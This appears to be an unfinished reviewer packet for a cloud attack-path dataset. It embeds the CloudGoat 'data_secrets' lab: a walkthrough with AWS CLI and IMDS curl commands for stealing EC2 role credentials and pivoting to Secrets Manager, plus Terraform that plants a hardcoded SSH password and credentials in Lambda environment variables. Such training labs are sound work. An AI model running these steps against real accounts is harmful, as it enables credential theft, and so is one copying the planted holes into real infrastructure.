@@ -1,0 +1,169 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "302769ba038fda16713414a302646b482f6e0b9454a34a9344228f19b05401cc",
+  "case_id": "cloudgoat:aws:data_secrets",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:data_secrets",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "data_secrets",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/cheat_sheet.md"
+    ],
+    "terraform_file_count": 8,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/",
+    "review_score": 55,
+    "independence_group": "cloudgoat-scenario:data_secrets",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/README.md",
+      "member_sha256": "350139192251c34fbe80d0d7b28bb762bfded42f0a8d0cafcc1e27d2971fa8d2",
+      "bytes": 1876,
+      "content_kind": "md",
+      "text": "Scenario: data_secrets\n======================\n\n**Size:** Small\n\n**Difficulty:** Easy\n\n**Command:** `./cloudgoat.py create data_secrets`\n\nScenario Resources\n------------------\n\n-   1 IAM User\n\n-   1 EC2 Instance\n\n-   1 IAM Role\n\n-   1 Lambda Function\n\n-   1 Secrets Manager Secret\n\nScenario Start(s)\n-----------------\n\n1.  AWS Access Key and Secret Key\n\nScenario Goal(s)\n----------------\n\nRetrieve the final flag stored in the AWS Secrets Manager.\n\nSummary\n-------\n\nIn this scenario, you start with an IAM user with limited permissions. Your task is to identify a misconfigured EC2 instance leaking credentials in its User Data, allowing you to gain SSH access. From there, you must pivot by exploiting the Instance Metadata Service (IMDS) to steal a role, enumerate Lambda functions to find hidden environment variables, and finally compromise a user with access to the scenario's objective: a secret stored in AWS Secrets Manager.\n\nExploitation Route\n------------------\n\nWalkthrough - Data Secrets\n--------------------------\n\n1.  Start by configuring your AWS CLI with the provided starting credentials.\n\n2.  Enumerate your permissions to discover the ability to read EC2 attributes.\n\n3.  Inspect the EC2 User Data to find hardcoded system user credentials.\n\n4.  SSH into the exposed EC2 instance using the credentials found in the User Data.\n\n5.  Query the EC2 Instance Metadata Service (IMDS) to steal the temporary credentials for the attached IAM Instance Profile.\n\n6.  Use the stolen session credentials to enumerate Lambda functions and view their configurations.\n\n7.  Discover a set of hardcoded AWS Access Keys hidden inside a Lambda function's Environment Variables.\n\n8.  Configure a final profile with these keys and use them to retrieve the flag from AWS Secrets Manager.\n\nA detailed cheat sheet & walkthrough for this route is available [here](./cheat_sheet.md). ",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/cheat_sheet.md",
+      "member_sha256": "3d47d1add81ffb70390b38bc52776fa094bb4e869b45459417024a039fc1c2ba",
+      "bytes": 5528,
+      "content_kind": "md",
+      "text": "Data Secrets Walkthrough\n========================\n\nSummary\n-------\n\nIn this scenario, you are provided with a starting IAM user with limited permissions. You need to enumerate EC2 instance attributes to discover hardcoded credentials in the User Data. Then, use those credentials to SSH into an EC2 instance and exploit the Instance Metadata Service (IMDS) to steal an IAM Role's credentials. With this new identity, you will enumerate Lambda functions to find hidden environment variables containing a third set of credentials. Finally, do this to authenticate as the final user and retrieve the flag from AWS Secrets Manager.\n\nDetailed Walkthrough\n--------------------\n\n### Step 1: Configure the Starting User\n\nFirst, configure the AWS CLI with the access key and secret key provided when you launched the scenario.\n\n\n```\naws configure --profile start_user\n# Enter Access Key ID\n# Enter Secret Access Key\n# Default region: us-east-1\n# Default output format: json\n\n```\n\n### Step 2: Enumerate Permissions & EC2 Resources\n\nCheck who you are and what permissions you might have. While `get-caller-identity` confirms your identity, often in these scenarios, you want to see what resources are visible.\n\n\n```\naws sts get-caller-identity --profile start_user\n\n```\n\nAttempt to list EC2 instances to see if any are running in the account.\n\n\n```\naws ec2 describe-instances --region us-east-1 --profile start_user\n\n```\n\nYou should see an instance listed. Take note of the **InstanceId** (e.g., `i-0xxxxxxxx`) and the **PublicIpAddress**.\n\n### Step 3: Analyze EC2 User Data\n\nA common misconfiguration in AWS is storing sensitive data (scripts, passwords, keys) in EC2 User Data, which is often visible to users who have `ec2:DescribeInstanceAttribute` permissions.\n\nRetrieve the User Data for the instance you found:\n\n\n```\naws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --region us-east-1 --profile start_user\n\n```\n\nThe output will contain a `UserData` field with a `Value` that is Base64 encoded. Decode it to read the contents:\n\n\n```\necho \"<BASE64_VALUE>\" | base64 --decode\n\n```\n\n**Analysis:** You should see a script that sets the password for the `ec2-user` to something like `ec2-user:CloudGoatInstancePassword!` and enables password authentication.\n\n### Step 4: SSH into the Instance\n\nUsing the IP address from Step 2 and the password found in Step 3, SSH into the instance.\n\n\n```\nssh ec2-user@<PUBLIC_IP>\n# When prompted, enter the password found in the User Data\n\n```\n\n### Step 5: Exploit Instance Metadata Service (IMDS)\n\nOnce inside the EC2 instance, you effectively have access to any IAM role attached to it. We can retrieve these credentials by querying the link-local address `169.254.169.254`.\n\nFirst, find the name of the IAM role attached to the instance:\n\n\n```\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n```\n\nYou should see a role name, such as `cg-ec2-instance-profile-<CGID>`. Now, retrieve the credentials for that role:\n\n\n```\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>\n\n```\n\n**Action:** Copy the `AccessKeyId`, `SecretAccessKey`, and `Token`.\n\n### Step 6: Configure the Stolen Profile\n\nBack on your local machine (exit the SSH session), configure a new profile using the credentials you just stole.\n\n**Note:** Because these are temporary session credentials, you **must** include the Session Token.\n\n\n```\naws configure --profile ec2_role\n# Enter the Access Key ID from the metadata\n# Enter the Secret Access Key from the metadata\n# Default region: us-east-1\n\n```\n\nManually add the session token to your credentials file (`~/.aws/credentials` on Linux/Mac or `%UserProfile%\\.aws\\credentials` on Windows):\n\n\n```\n[ec2_role]\naws_access_key_id = ...\naws_secret_access_key = ...\naws_session_token = <PASTE_TOKEN_HERE>\n\n```\n\n### Step 7: Enumerate Lambda Functions\n\nWith the new `ec2_role` profile, explore other services. Lambda is a common place for lateral movement. List the functions in the region:\n\n\n```\naws lambda list-functions --region us-east-1 --profile ec2_role\n\n```\n\nYou should see a function named `cg-lambda-function-<CGID>`.\n\n### Step 8: Extract Secrets from Lambda Environment Variables\n\nDevelopers often improperly store API keys or database credentials in Lambda environment variables. Retrieve the configuration details of the function to check for this:\n\n\n```\naws lambda get-function --function-name <FUNCTION_NAME> --region us-east-1 --profile ec2_role\n\n```\n\nLook at the JSON output under `Configuration` -> `Environment` -> `Variables`. You should see two variables: `DB_USER_ACCESS_KEY` and `DB_USER_SECRET_KEY`.\n\n### Step 9: Configure the Final User Profile\n\nThese keys appear to belong to another IAM user. Configure a new profile on your local machine using these credentials.\n\n\n```\naws configure --profile lambda_user\n# Enter the Access Key ID found in Lambda\n# Enter the Secret Access Key found in Lambda\n\n```\n\n### Step 10: Retrieve the Final Flag\n\nWith this new user, check if you have access to AWS Secrets Manager, which is often used to store high-value secrets.\n\nList the secrets:\n\n\n```\naws secretsmanager list-secrets --region us-east-1 --profile lambda_user\n\n```\n\nYou should see a secret named `cg-final-flag-<CGID>`. Retrieve the secret value:\n\n\n```\naws secretsmanager get-secret-value --secret-id <SECRET_ARN> --region us-east-1 --profile lambda_user\n\n```\n\nThe output will contain a `SecretString`. Parse it to find the flag!\n\n**Congratulations! You have completed the scenario.**",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/manifest.yml",
+      "member_sha256": "da44ea5d639d1e7ef2e36c43c98fef4047704cbfe088124afeb0b25edc173748",
+      "bytes": 574,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: \"data_secrets\"\n  # The name of the author(s), comma separated\n- author: \"Tyler Ramsbey\"\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: \"1.0.0\"\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        \"Launch the scenario and check the Github if you need help.\"\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: \"12-15-2025\"\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/ec2.tf",
+      "member_sha256": "79cd80145a182e4d1f0d41bbd3110c3e294ad6a4fbf991bdebb466c1972aa182",
+      "bytes": 1429,
+      "content_kind": "tf",
+      "text": "data \"aws_ami\" \"amazon_linux\" {\n  most_recent = true\n  owners      = [\"amazon\"]\n\n  filter {\n    name   = \"name\"\n    values = [\"amzn2-ami-hvm-*-x86_64-gp2\"]\n  }\n}\n\nresource \"aws_instance\" \"ec2_instance\" {\n  ami                         = data.aws_ami.amazon_linux.id\n  instance_type               = \"t3.micro\"\n  iam_instance_profile        = aws_iam_instance_profile.ec2_instance_profile.name\n  subnet_id                   = aws_subnet.subnet.id\n  associate_public_ip_address = true\n\n  vpc_security_group_ids = [\n    aws_security_group.sg.id\n  ]\n\n  # VULNERABILITY: Sensitive credentials stored in User Data\n  user_data = <<-EOF\n    #!/bin/bash\n    echo \"ec2-user:CloudGoatInstancePassword!\" | chpasswd\n    sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config\n    service sshd restart\n  EOF\n\n  tags = {\n    Name = \"cg-sensitive-ec2-${var.cgid}\"\n    Stack = var.stack-name\n    Scenario = var.scenario-name\n  }\n}\n\nresource \"aws_security_group\" \"sg\" {\n  name        = \"cg-sg-${var.cgid}\"\n  description = \"Allow SSH inbound traffic\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-sg-${var.cgid}\"\n    Stack = var.stack-name\n    Scenario = var.scenario-name\n  }\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/iam.tf",
+      "member_sha256": "f86bb86d6c2523ec79fba9c9b2a215d12ba1201a1633e836755bc8d6c42160fa",
+      "bytes": 2685,
+      "content_kind": "tf",
+      "text": "# 1. Starting User\n# Attack Path: Starts here. Can Describe EC2 to find User Data.\nresource \"aws_iam_user\" \"start_user\" {\n  name = \"cg-start-user-${var.cgid}\"\n  tags = {\n    Name = \"cg-start-user-${var.cgid}\"\n    Stack = var.stack-name\n    Scenario = var.scenario-name\n  }\n}\n\nresource \"aws_iam_access_key\" \"start_user\" {\n  user = aws_iam_user.start_user.name\n}\n\nresource \"aws_iam_user_policy\" \"start_user_policy\" {\n  name = \"cg-start-user-policy-${var.cgid}\"\n  user = aws_iam_user.start_user.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"ec2:DescribeInstances\",\n          \"ec2:DescribeInstanceAttribute\",\n          \"ec2:DescribeTags\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\n# 2. EC2 Instance Role\n# Attack Path: Acquired via Metadata (IMDS). Can read Lambda details.\nresource \"aws_iam_role\" \"ec2_role\" {\n  name = \"cg-ec2-role-${var.cgid}\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Effect = \"Allow\"\n      }\n    ]\n  })\n  tags = {\n    Name = \"cg-ec2-role-${var.cgid}\"\n    Stack = var.stack-name\n    Scenario = var.scenario-name\n  }\n}\n\nresource \"aws_iam_role_policy\" \"ec2_role_policy\" {\n  name = \"cg-ec2-policy-${var.cgid}\"\n  role = aws_iam_role.ec2_role.id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"lambda:ListFunctions\",\n          \"lambda:GetFunction\",\n          \"lambda:GetFunctionConfiguration\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_instance_profile\" \"ec2_instance_profile\" {\n  name = \"cg-ec2-instance-profile-${var.cgid}\"\n  role = aws_iam_role.ec2_role.name\n}\n\n# 3. Hidden User (Stored in Lambda)\n# Attack Path: Credentials found in Lambda Env Vars. Can read Secrets.\nresource \"aws_iam_user\" \"lambda_user\" {\n  name = \"cg-lambda-user-${var.cgid}\"\n  tags = {\n    Name = \"cg-lambda-user-${var.cgid}\"\n    Stack = var.stack-name\n    Scenario = var.scenario-name\n  }\n}\n\nresource \"aws_iam_access_key\" \"lambda_user\" {\n  user = aws_iam_user.lambda_user.name\n}\n\nresource \"aws_iam_user_policy\" \"lambda_user_policy\" {\n  name = \"cg-lambda-user-policy-${var.cgid}\"\n  user = aws_iam_user.lambda_user.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"secretsmanager:GetSecretValue\",\n          \"secretsmanager:ListSecrets\",\n          \"secretsmanager:DescribeSecret\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/lambda.tf",
+      "member_sha256": "8bea4fb6137f80a9ee1277948a11ccf3c487822ad15c5629adf5ed8dd28987ad",
+      "bytes": 1251,
+      "content_kind": "tf",
+      "text": "# Create a dummy zip file for the lambda function\ndata \"archive_file\" \"lambda_zip\" {\n  type        = \"zip\"\n  output_path = \"${path.module}/lambda_function.zip\"\n  \n  source {\n    content  = \"def lambda_handler(event, context): return 'Hello from CloudGoat'\"\n    filename = \"lambda_function.py\"\n  }\n}\n\nresource \"aws_iam_role\" \"lambda_exec_role\" {\n  name = \"cg-lambda-exec-role-${var.cgid}\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Action = \"sts:AssumeRole\"\n      Effect = \"Allow\"\n      Principal = {\n        Service = \"lambda.amazonaws.com\"\n      }\n    }]\n  })\n}\n\nresource \"aws_lambda_function\" \"sensitive_lambda\" {\n  filename      = data.archive_file.lambda_zip.output_path\n  function_name = \"cg-lambda-function-${var.cgid}\"\n  role          = aws_iam_role.lambda_exec_role.arn\n  handler       = \"lambda_function.lambda_handler\"\n  runtime       = \"python3.9\"\n\n  # VULNERABILITY: Credentials stored in Environment Variables\n  environment {\n    variables = {\n      DB_USER_ACCESS_KEY = aws_iam_access_key.lambda_user.id\n      DB_USER_SECRET_KEY = aws_iam_access_key.lambda_user.secret\n    }\n  }\n\n  tags = {\n    Name = \"cg-lambda-${var.cgid}\"\n    Stack = var.stack-name\n    Scenario = var.scenario-name\n  }\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/output.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/output.tf",
+      "member_sha256": "83f0c2372d815d65c83a7f08fff4b7a8bab84136731a2f457b3617648ca2d8a0",
+      "bytes": 303,
+      "content_kind": "tf",
+      "text": "output \"start_user_access_key\" {\n  description = \"The access key for the starting user\"\n  value       = aws_iam_access_key.start_user.id\n}\n\noutput \"start_user_secret_key\" {\n  description = \"The secret key for the starting user\"\n  value       = aws_iam_access_key.start_user.secret\n  sensitive   = true\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/provider.tf",
+      "member_sha256": "4d389a6aad20ad29e17932fa296aaf1807e4917074f9cbd9be3ddf5ade5c3d73",
+      "bytes": 533,
+      "content_kind": "tf",
+      "text": "## This is used for the CloudGoat scenario to pull the AWS profile from the CloudGoat configuration.\n## Configure required Terraform and provider versions.\n\nterraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.74.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  # This configures default tags for all resources\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/secrets.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/secrets.tf",
+      "member_sha256": "d7273b1d0fcbfbe912dc7be7dd7d3c0bad71be0da5d3a22a50b48d910455e758",
+      "bytes": 464,
+      "content_kind": "tf",
+      "text": "resource \"aws_secretsmanager_secret\" \"final_flag\" {\n  name = \"cg-final-flag-${var.cgid}\"\n  description = \"The final flag for the CloudGoat scenario\"\n  \n  tags = {\n    Name = \"cg-final-flag-${var.cgid}\"\n    Stack = var.stack-name\n    Scenario = var.scenario-name\n  }\n}\n\nresource \"aws_secretsmanager_secret_version\" \"final_flag_value\" {\n  secret_id     = aws_secretsmanager_secret.final_flag.id\n  secret_string = jsonencode({\n    flag = \"d4t4_s3cr3ts_4r3_fun\"\n  })\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/variables.tf",
+      "member_sha256": "da8a3414ad3646825b6ee03e47cdba014880911f7b2e5094d87f3f0b23adb44b",
+      "bytes": 814,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use when deploying resources\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy resources into\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming between scenarios\"\n  type        = string\n}\n\n# This resources is not needed for scenarios, but should be used on any public facing resources\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es)\"\n  type        = list(string)\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario being deployed\"\n  default     = \"scenario_template\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/data_secrets/terraform/vpc.tf",
+      "member_sha256": "5cb448d322ac03f3ff2f391e0b7c74370ba1fa199de6522bf557906baee82d02",
+      "bytes": 940,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"vpc\" {\n  cidr_block = \"10.0.0.0/16\"\n  tags = {\n    Name = \"cg-vpc-${var.cgid}\"\n  }\n}\n\nresource \"aws_internet_gateway\" \"igw\" {\n  vpc_id = aws_vpc.vpc.id\n  tags = {\n    Name = \"cg-igw-${var.cgid}\"\n  }\n}\n\nresource \"aws_subnet\" \"subnet\" {\n  vpc_id                  = aws_vpc.vpc.id\n  cidr_block              = \"10.0.1.0/24\"\n  availability_zone       = \"us-east-1a\"\n  map_public_ip_on_launch = true\n\n  tags = {\n    Name = \"cg-subnet-${var.cgid}\"\n  }\n}\n\nresource \"aws_route_table\" \"route_table\" {\n  vpc_id = aws_vpc.vpc.id\n  tags = {\n    Name = \"cg-route-table-${var.cgid}\"\n  }\n}\n\nresource \"aws_route\" \"route\" {\n  route_table_id         = aws_route_table.route_table.id\n  destination_cidr_block = \"0.0.0.0/0\"\n  gateway_id             = aws_internet_gateway.igw.id\n}\n\nresource \"aws_route_table_association\" \"route_table_association\" {\n  subnet_id      = aws_subnet.subnet.id\n  route_table_id = aws_route_table.route_table.id\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "f4afd3ba2ffa58ce0e86365311c981558e6c32718439172dee1214dd13ff0c6c",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
